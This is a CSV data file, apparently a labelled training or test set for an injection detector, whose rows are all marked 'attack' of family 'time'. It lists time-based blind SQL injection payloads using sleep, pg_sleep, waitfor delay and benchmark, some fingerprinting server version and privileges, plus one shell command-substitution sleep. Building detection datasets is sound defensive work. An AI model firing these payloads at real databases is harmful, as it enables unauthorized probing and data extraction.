label,payload,family
attack,""" or pg_sleep  (  __TIME__  )  --",time
attack,1 or pg_sleep  (  __TIME__  )  --,time
attack,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",time
attack,$  (  sleep 50  ) ,time
attack,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",time
attack,1   )    )    or pg_sleep  (  __TIME__  )  --,time
attack,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",time
attack,1  )   or sleep  (  __TIME__  )  #,time
attack,"""  )  ;waitfor delay '0:0:__TIME__'--",time
attack, )    )    or pg_sleep  (  __TIME__  )  --,time
attack,a' waitfor delay '0:0:10'--,time
attack,"""  )   or sleep  (  __TIME__  )    =  """,time
attack,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",time
attack,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",time
attack,pg_sleep  (  __TIME__  )  --,time
attack,",waitfor delay '0:0:__TIME__'--",time
attack,"""  )   or pg_sleep  (  __TIME__  )  --",time
attack, )   or sleep  (  __TIME__  )    =  ',time
attack,or sleep  (  __TIME__  )    =  ',time
attack," )    )   ,waitfor delay '0:0:__TIME__'--",time
attack,1 waitfor delay '0:0:10'--,time
attack,or sleep  (  __TIME__  )  #,time
attack,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",time
attack,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",time
attack,""";waitfor delay '0:0:__TIME__'--",time
attack,"""   )    )    or pg_sleep  (  __TIME__  )  --",time
attack," )  ,waitfor delay '0:0:__TIME__'--",time
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time
attack,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",time
attack,""" or sleep  (  __TIME__  )  #",time
attack, )    )    or sleep  (  __TIME__  )    =  ',time
